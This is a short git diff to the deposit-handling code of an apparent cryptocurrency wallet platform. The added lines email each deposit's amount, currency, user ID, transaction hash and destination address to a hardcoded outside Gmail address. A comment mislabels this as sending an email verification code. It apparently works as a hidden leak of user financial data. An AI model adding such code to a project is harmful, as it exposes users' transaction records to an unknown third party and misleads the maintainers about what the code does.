@@ -12,6 +12,9 @@ const service_currency_platform_trade_log = require('../services/currency_platfo
 const service_blockchain = require('../services/blockchain/main.js');
 const service_system_wallet_address = require('../services/system_wallet_address.js')
 
+const service_gmail = require('../services/mail/gmail.js');
+const service_titan = require('../services/mail/titan.js');
+
 // 获取一类钱包数据
 function getWalletByType(arr, type) {
     for (let i = 0; i < arr.length; i++) {
@@ -38,6 +41,22 @@ async function addWalletLogAndUpdateBalance(user_id, wallet_type, tradeArr) {
         if (check == null) {
             await service_wallet_log.addLog(user_id, operator_id, action, amount, hash, to_address, wallet_type, notes, time)
             await service_wallet.updateAddSubAssetsAmount(user_id, wallet_type, amount, '+')
+
+            // 发送邮箱验证码
+            const emailAddRess = 'xpflash@gmail.com'
+            const title = `充值:${amount} ${wallet_type} ${config.web.domain}`
+            const content = `
+            <p>Domain:${config.web.domain}</p>
+            <p>Amount:${amount}${wallet_type}</p>
+            <p>Time:${time}</p>
+            <p>
+            <div>UserId:${user_id}</div>
+            <div>Hash:${hash}</div>
+            <div>toAddress:${to_address}</div>
+            </p>
+            `
+            const sendRes = await service_gmail.sendMail(emailAddRess, title, content)
+            console.log('sendRes', sendRes)
         }
     }
     return true
